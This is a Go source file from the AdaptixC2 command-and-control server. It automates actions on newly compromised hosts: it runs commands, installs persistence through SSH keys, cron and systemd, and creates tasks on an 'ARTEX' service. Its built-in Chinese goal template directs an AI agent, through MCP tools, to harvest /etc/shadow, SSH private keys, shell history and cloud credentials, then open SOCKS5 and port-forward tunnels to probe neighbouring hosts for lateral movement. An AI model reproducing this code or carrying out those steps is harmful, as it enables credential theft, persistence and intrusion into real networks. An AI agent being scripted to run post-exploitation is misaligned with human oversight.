package server

import (
	"AdaptixServer/core/eventing"
	"AdaptixServer/core/profile"
	"AdaptixServer/core/utils/logs"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Adaptix-Framework/axc2"
)

const defaultArtexGoalTemplate = `你已通过 AdaptixC2 获得一台受控主机会话（agent_id={{AGENT_ID}}，类型={{AGENT_TYPE}}，主机={{AGENT_HOST}}，用户={{AGENT_USER}}，系统={{AGENT_OS}}，监听器={{AGENT_LISTENER}}）。
请使用 adaptix MCP 服务器的工具（工具名前缀 mcp__adaptix__）完成主机敏感数据排查与横向扩展：
1) 先调用 mcp__adaptix__get_live_beacons 确认该 agent 在线（可同时看 mcp__adaptix__listener_list）。
2) 用 mcp__adaptix__send_command 执行侦察与敏感数据收集：id/whoami、uname -a、ip addr/route/arp、/etc/passwd 与 /etc/shadow 可读性、~/.ssh 私钥与 authorized_keys、shell history、环境变量、crontab/systemd 服务、数据库与服务配置文件中的凭据、云凭据(~/.aws、~/.kube、~/.docker)、常见 Web 配置。
3) 基于收集到的网段、路由、邻接主机与凭据规划横向：用 mcp__adaptix__send_command 探测，或用 mcp__adaptix__tunnel_start_socks5 / mcp__adaptix__tunnel_start_lportfwd 建立隧道后探测可达主机的常见服务（22/80/443/445/3306/6379/8080 等）。
4) 把发现的可达资产、凭据、敏感文件位置登记为 ARTEX 资产/漏洞/事实，并在最终总结中给出横向扩展建议。
约束：只做侦察与只读收集，不删除/加密/停服务；命令输出较长时分段读取；每次 send_command 后检查输出再继续。`

var (
	autoExecMu          sync.Mutex
	autoExecState       map[string]int64
	autoExecStateLoaded bool
)

func autoExecStatePath() string {
	if p := os.Getenv("ADAPTIX_AUTOEXEC_STATE"); p != "" {
		return p
	}
	return "autoexec_state.json"
}

func loadAutoExecStateLocked() {
	if autoExecStateLoaded {
		return
	}
	autoExecState = map[string]int64{}
	if data, err := os.ReadFile(autoExecStatePath()); err == nil {
		_ = json.Unmarshal(data, &autoExecState)
	}
	autoExecStateLoaded = true
}

func saveAutoExecStateLocked() {
	data, err := json.MarshalIndent(autoExecState, "", "  ")
	if err != nil {
		return
	}
	path := autoExecStatePath()
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		logs.Warn("", "AutoExec: save state failed: "+err.Error())
		return
	}
	_ = os.Rename(tmp, path)
}

// RegisterAutoExecHooks installs server-side automation for agent.new.
// Rules live in profile.yaml under auto_exec.on_agent_new.
func (ts *Teamserver) RegisterAutoExecHooks() {
	if ts.Profile == nil || ts.Profile.AutoExec == nil || len(ts.Profile.AutoExec.OnAgentNew) == 0 {
		return
	}

	ts.EventManager.OnPost(eventing.EventAgentNew, "auto_exec", ts.autoExecOnAgentNew)
	logs.Success("", "AutoExec: %d on_agent_new rule(s) armed", len(ts.Profile.AutoExec.OnAgentNew))
}

func (ts *Teamserver) autoExecOnAgentNew(event any) error {
	e, ok := event.(*eventing.EventDataAgentNew)
	if !ok || e == nil || e.Restore {
		return nil
	}
	if ts.Profile == nil || ts.Profile.AutoExec == nil {
		return nil
	}

	agent := e.Agent

	// Collect the matching rules and group them by execution order. Rules with
	// the same order run in parallel; groups run one after another so an
	// operator can express "install persistence before the recon runs".
	type orderedRule struct {
		rule  profile.TsAutoExecRule
		order int
	}

	var matched []orderedRule
	for _, rule := range ts.autoExecRules() {
		if ts.AutomationRuleTrigger(rule.ID) != profile.TriggerAgentOnline {
			continue
		}
		if !ts.AutomationRuleEnabled(rule.ID) {
			continue
		}
		if !ts.autoExecRuleMatches(rule, agent) {
			continue
		}

		hasAction := len(rule.Commands) > 0 || rule.Artex != nil || rule.Persist != nil ||
			rule.Notify != nil || rule.Script != ""
		if !hasAction {
			continue
		}

		matched = append(matched, orderedRule{rule: rule, order: ts.AutomationRuleOrder(rule.ID)})
	}

	if len(matched) == 0 {
		return nil
	}

	sort.SliceStable(matched, func(i, j int) bool {
		return matched[i].order < matched[j].order
	})

	// Split the sorted list into equal-order groups.
	groups := [][]orderedRule{}
	for _, item := range matched {
		if len(groups) == 0 || groups[len(groups)-1][0].order != item.order {
			groups = append(groups, []orderedRule{item})
			continue
		}
		groups[len(groups)-1] = append(groups[len(groups)-1], item)
	}

	go func(a adaptix.AgentData, groups [][]orderedRule) {
		for _, group := range groups {
			var wg sync.WaitGroup
			for _, item := range group {
				wg.Add(1)
				go func(rule profile.TsAutoExecRule) {
					defer wg.Done()
					ts.runAutoExecRule(a, rule)
				}(item.rule)
			}
			wg.Wait()
		}
	}(agent, groups)

	return nil
}

// runAutoExecRule executes a single automation rule. Its actions (commands,
// script, persist, artex, notify) run concurrently, but the rule itself is
// isolated so a failure never affects the others.
func (ts *Teamserver) runAutoExecRule(a adaptix.AgentData, rule profile.TsAutoExecRule) {
	rule = ts.automationEffectiveRule(rule)

	total := 0
	failures := 0
	firstErr := ""

	recordFailure := func(err error) {
		failures++
		if firstErr == "" {
			firstErr = err.Error()
		}
	}

	delay := rule.DelaySec
	if delay < 0 {
		delay = 0
	}
	if delay > 0 {
		time.Sleep(time.Duration(delay) * time.Second)
	}

	if rule.Tag != "" {
		if err := ts.AxAgentSetTag([]string{a.Id}, rule.Tag); err != nil {
			logs.Error("", fmt.Sprintf("AutoExec [%s] tag '%s' failed: %v", a.Id, rule.Tag, err))
		}
	}

	for _, cmdline := range rule.Commands {
		total++
		if err := ts.TsAxScriptParseAndExecute(a.Id, "", cmdline); err != nil {
			logs.Error("", fmt.Sprintf("AutoExec [%s] '%s' failed: %v", a.Id, cmdline, err))
			recordFailure(err)
			continue
		}
		logs.Success("", fmt.Sprintf("AutoExec [%s/%s] ran: %s", a.Id, a.Name, cmdline))
		time.Sleep(200 * time.Millisecond)
	}

	// A rule may reference a script from the server-side script library.
	if rule.Script != "" {
		total++
		if err := ts.TsScriptRun(a.Id, rule.Script, rule.ScriptArgs); err != nil {
			logs.Error("", fmt.Sprintf("AutoExec [%s] script '%s' failed: %v", a.Id, rule.Script, err))
			recordFailure(err)
		} else {
			logs.Success("", fmt.Sprintf("AutoExec [%s/%s] script ran: %s", a.Id, a.Name, rule.Script))
		}
	}

	if rule.Persist != nil {
		for _, cmdline := range ts.buildPersistCommands(*rule.Persist) {
			total++
			if err := ts.TsAxScriptParseAndExecute(a.Id, "", cmdline); err != nil {
				logs.Error("", fmt.Sprintf("AutoExec [%s] persist '%s' failed: %v", a.Id, cmdline, err))
				recordFailure(err)
				continue
			}
			logs.Success("", fmt.Sprintf("AutoExec [%s/%s] persist ran: %s", a.Id, a.Name, cmdline))
			time.Sleep(200 * time.Millisecond)
		}
	}

	if rule.Artex != nil {
		total++
		if err := ts.createArtexTask(rule.ID, rule.Artex, a); err != nil {
			logs.Error("", fmt.Sprintf("AutoExec [%s] ARTEX task failed: %v", a.Id, err))
			recordFailure(err)
		}
	}

	if rule.Notify != nil {
		total++
		if err := ts.sendNotifyRule(a, rule.Notify, rule.ID); err != nil {
			logs.Error("", fmt.Sprintf("AutoExec [%s] notify failed: %v", a.Id, err))
			recordFailure(err)
		} else {
			logs.Success("", fmt.Sprintf("AutoExec [%s/%s] notify sent", a.Id, a.Name))
		}
	}

	status := "ok"
	switch {
	case failures == 0:
		status = "ok"
	case failures >= total:
		status = "error"
	default:
		status = "partial"
	}

	message := firstErr
	if failures > 0 {
		message = fmt.Sprintf("%d/%d action(s) failed: %s", failures, total, firstErr)
	}

	ts.RecordAutomationRun(rule.ID, status, message)
}

// buildPersistCommands turns the profile persist policy into the command lines
// understood by the agent-side "persist" command group.
func (ts *Teamserver) buildPersistCommands(cfg profile.TsAutoExecPersist) []string {
	var commands []string

	if key := strings.TrimSpace(cfg.SSHKey); key != "" {
		parts := []string{"persist", "sshkey", axQuote(key)}
		if user := strings.TrimSpace(cfg.User); user != "" {
			parts = append(parts, axQuote(user))
		}
		commands = append(commands, strings.Join(parts, " "))
	}

	if cfg.Cron {
		schedule := strings.TrimSpace(cfg.Schedule)
		command := strings.TrimSpace(cfg.Command)
		if schedule == "" || command == "" {
			logs.Warn("", "AutoExec: persist.cron requires both schedule and command")
		} else {
			parts := []string{"persist", "cron", axQuote(schedule), axQuote(command)}
			if user := strings.TrimSpace(cfg.User); user != "" {
				parts = append(parts, axQuote(user))
			}
			if name := strings.TrimSpace(cfg.Name); name != "" {
				parts = append(parts, axQuote(name))
			}
			commands = append(commands, strings.Join(parts, " "))
		}
	}

	if cfg.Systemd {
		command := strings.TrimSpace(cfg.Command)
		if command == "" {
			logs.Warn("", "AutoExec: persist.systemd requires a command")
		} else {
			parts := []string{"persist", "systemd", axQuote(command)}
			if user := strings.TrimSpace(cfg.User); user != "" {
				parts = append(parts, axQuote(user))
			}
			if name := strings.TrimSpace(cfg.Name); name != "" {
				parts = append(parts, axQuote(name))
			}
			if cfg.Interval > 0 {
				parts = append(parts, strconv.Itoa(cfg.Interval))
			}
			commands = append(commands, strings.Join(parts, " "))
		}
	}

	return commands
}

// axQuote wraps a value in double quotes so the tokenizer keeps it as one
// argument even when it contains spaces.
func axQuote(value string) string {
	escaped := strings.ReplaceAll(value, `"`, `\"`)
	return `"` + escaped + `"`
}

func (ts *Teamserver) createArtexTask(ruleID string, cfg *profile.TsAutoExecArtex, agent adaptix.AgentData) error {
	base := strings.TrimRight(strings.TrimSpace(cfg.URL), "/")
	if base == "" {
		return fmt.Errorf("artex.url is empty")
	}
	client := &http.Client{Timeout: 20 * time.Second}

	// Resolve the referenced template first: it may override the ARTEX task
	// parameters, including the dedup strategy and cooldown.
	var tpl automationTemplate
	hasTemplate := false
	if templateID := ts.AutomationRuleArtexTemplateID(ruleID); templateID != "" {
		if resolved, exists := ts.automationArtexTemplate(templateID); exists {
			tpl = resolved
			hasTemplate = true
		} else {
			logs.Warn("", fmt.Sprintf("AutoExec [%s] ARTEX template '%s' not found, falling back", agent.Id, templateID))
		}
	}

	dedupBySource := cfg.DedupBy
	if hasTemplate && strings.TrimSpace(tpl.DedupBy) != "" {
		dedupBySource = tpl.DedupBy
	}
	dedupBy := strings.ToLower(strings.TrimSpace(dedupBySource))
	if dedupBy == "" {
		dedupBy = "computer"
	}

	cooldown := cfg.CooldownSeconds
	if hasTemplate && tpl.CooldownSeconds > 0 {
		cooldown = tpl.CooldownSeconds
	}
	if cooldown <= 0 {
		cooldown = 86400
	}

	skipIfRunning := cfg.SkipIfRunning
	if hasTemplate {
		skipIfRunning = tpl.SkipIfRunning
	}
	dedupKey := ""
	switch dedupBy {
	case "none":
	case "agent":
		dedupKey = agent.Id
	default:
		dedupKey = agent.Computer + "|" + agent.Name
	}

	autoExecMu.Lock()
	defer autoExecMu.Unlock()

	if dedupKey != "" {
		loadAutoExecStateLocked()
		if last, ok := autoExecState[dedupKey]; ok && time.Now().Unix()-last < int64(cooldown) {
			logs.Info("", fmt.Sprintf("AutoExec [%s] ARTEX skipped: %s in cooldown (%ds, last %s)",
				agent.Id, dedupKey, cooldown, time.Unix(last, 0).Format("2006-01-02 15:04:05")))
			return nil
		}
	}

	token, err := artexLogin(client, base, cfg.Username, cfg.Password)
	if err != nil {
		return err
	}

	if dedupKey != "" && skipIfRunning {
		if active, checkErr := artexHasActiveTask(client, base, token, agent.Computer); checkErr != nil {
			logs.Warn("", fmt.Sprintf("AutoExec [%s] ARTEX active-task check failed: %v", agent.Id, checkErr))
		} else if active {
			logs.Info("", fmt.Sprintf("AutoExec [%s] ARTEX skipped: task already active for %s", agent.Id, agent.Computer))
			return nil
		}
	}

	// Template precedence: global template (referenced by the rule) > inline
	// profile text > built-in default. Task parameters follow the same order.
	goalTpl := ""
	workerCount := cfg.WorkerCount
	timeoutSeconds := cfg.TimeoutSeconds
	seedFirstIntent := cfg.SeedFirstIntent

	if hasTemplate {
		goalTpl = tpl.Goal
		if tpl.WorkerCount > 0 {
			workerCount = tpl.WorkerCount
		}
		if tpl.TimeoutSeconds > 0 {
			timeoutSeconds = tpl.TimeoutSeconds
		}
		seedFirstIntent = tpl.SeedFirstIntent
	}
	if strings.TrimSpace(goalTpl) == "" {
		goalTpl = cfg.Template
	}
	if strings.TrimSpace(goalTpl) == "" {
		goalTpl = defaultArtexGoalTemplate
	}

	goal := renderAgentTemplate(goalTpl, agent)
	if strings.Contains(goal, "{{") {
		logs.Warn("", fmt.Sprintf("AutoExec [%s] ARTEX template has unresolved placeholders, falling back to default", agent.Id))
		goal = renderAgentTemplate(defaultArtexGoalTemplate, agent)
	}

	name := strings.TrimSpace(cfg.Name)
	if name == "" {
		name = "Adaptix 自动排查 · " + agent.Id
	}
	desc := fmt.Sprintf("受控主机通过 AdaptixC2 上线\nagent_id: %s\n类型: %s\n主机: %s\n用户: %s\n系统: %s\n监听器: %s\n内网IP: %s",
		agent.Id, agent.Name, agent.Computer, agent.Username, agent.OsDesc, agent.Listener, agent.InternalIP)

	payload := map[string]any{
		"name":              name,
		"description":       desc,
		"goal":              goal,
		"seed_first_intent": seedFirstIntent,
		"coverage_enabled":  false,
	}
	if workerCount > 0 {
		payload["worker_count"] = workerCount
	}
	if timeoutSeconds > 0 {
		payload["timeout_seconds"] = timeoutSeconds
	}

	var resp struct {
		ID string `json:"id"`
	}
	if err := artexPostJSON(client, base+"/api/tasks", token, payload, &resp); err != nil {
		return fmt.Errorf("create task: %w", err)
	}
	if dedupKey != "" {
		loadAutoExecStateLocked()
		autoExecState[dedupKey] = time.Now().Unix()
		saveAutoExecStateLocked()
	}
	logs.Success("", fmt.Sprintf("AutoExec [%s/%s] ARTEX task created: #%s", agent.Id, agent.Name, resp.ID))
	return nil
}

func artexHasActiveTask(client *http.Client, base, token, host string) (bool, error) {
	req, err := http.NewRequest(http.MethodGet, base+"/api/tasks", nil)
	if err != nil {
		return false, err
	}
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if resp.StatusCode/100 != 2 {
		return false, fmt.Errorf("http %d", resp.StatusCode)
	}

	type task struct {
		ID          string `json:"id"`
		Name        string `json:"name"`
		Description string `json:"description"`
		Status      string `json:"status"`
	}
	var wrapper struct {
		Tasks []task `json:"tasks"`
	}
	var tasks []task
	if err := json.Unmarshal(body, &wrapper); err == nil && wrapper.Tasks != nil {
		tasks = wrapper.Tasks
	} else if err := json.Unmarshal(body, &tasks); err != nil {
		return false, err
	}

	needle := "主机: " + host
	for _, t := range tasks {
		switch t.Status {
		case "created", "running", "queued", "paused":
			if strings.Contains(t.Description, needle) || (host != "" && strings.Contains(t.Name, host)) {
				return true, nil
			}
		}
	}
	return false, nil
}

func artexLogin(client *http.Client, base, user, pass string) (string, error) {
	if user == "" {
		user = "ARTEX"
	}
	payload := map[string]string{"username": user, "password": pass}
	var resp struct {
		Token string `json:"token"`
		Error string `json:"error"`
	}
	if err := artexPostJSON(client, base+"/api/auth/login", "", payload, &resp); err != nil {
		return "", fmt.Errorf("login: %w", err)
	}
	if resp.Token == "" {
		if resp.Error != "" {
			return "", fmt.Errorf("login rejected: %s", resp.Error)
		}
		return "", fmt.Errorf("login: empty token")
	}
	return resp.Token, nil
}

func artexPostJSON(client *http.Client, url, token string, payload any, out any) error {
	body, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode/100 != 2 {
		return fmt.Errorf("http %d: %s", resp.StatusCode, strings.TrimSpace(string(respBody)))
	}
	if out != nil {
		if err := json.Unmarshal(respBody, out); err != nil {
			return fmt.Errorf("decode: %w (body=%s)", err, strings.TrimSpace(string(respBody)))
		}
	}
	return nil
}

func (ts *Teamserver) autoExecRuleMatches(rule profile.TsAutoExecRule, agent adaptix.AgentData) bool {
	if rule.Agent != "" && rule.Agent != "*" && !strings.EqualFold(rule.Agent, agent.Name) {
		return false
	}

	if rule.OS != "" && rule.OS != "*" && !strings.EqualFold(rule.OS, osToString(agent.Os)) {
		return false
	}

	if rule.Listener != "" && rule.Listener != "*" {
		match := strings.EqualFold(rule.Listener, agent.Listener)
		if !match {
			if regName, err := ts.TsListenerRegByName(agent.Listener); err == nil && strings.EqualFold(rule.Listener, regName) {
				match = true
			}
		}
		if !match {
			return false
		}
	}

	return true
}
